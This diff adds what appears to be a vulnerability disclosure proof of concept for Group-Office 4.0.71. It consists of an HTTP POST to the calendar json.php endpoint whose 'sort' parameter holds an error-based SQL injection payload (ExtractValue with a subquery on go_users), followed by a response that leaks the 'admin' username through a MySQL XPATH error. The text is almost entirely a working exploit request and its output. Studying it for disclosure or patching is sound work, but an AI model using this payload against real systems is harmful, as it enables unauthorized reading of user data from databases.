@@ -1,0 +1,34 @@
+Example Request (version 4.0.71):
++--------------------------------
+
+POST /groupoffice/modules/calendar/json.php HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 162
+Cookie: groupoffice=tgocfuhoh7lrqo0mckfef4us04; GO_LANGUAGE=en_UK
+
+sort=ExtractValue(1,CONCAT(0x5c,(SELECT%20username%20FROM%20go_users%20LIMIT
+%201)))&dir=ASC&task=writable_views&limit=20&security_token=pfi5lckw3r9qm64n
+adgb
+
+
+---
+Example Response (version 4.0.71):
++---------------------------------
+
+HTTP/1.1 200 OK
+Date: Fri, 20 Jul 2012 14:16:09 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 397
+Content-Type: text/html; charset=UTF-8
+
+{"feedback":"<b>Database error:<\/b> Invalid SQL: SELECT SQL_CALC_FOUND
+_ROWS v.* FROM cal_views v INNER JOIN go_acl a ON (v.acl_id = a.acl_id AND 
+a.level>10 AND (a.user_id=1 OR a.group_id IN (1,2,3)))  GROUP BY v.id ORDER BY 
+ExtractValue(1,CONCAT(0x5c,(SELECT username FROM go_users LIMIT 1))) ASC 
+LIMIT 0,20<br>\n<b>MySQL Error<\/b>: 1105 (XPATH syntax 
+error: '\\admin')<br>\n","success":false}
+
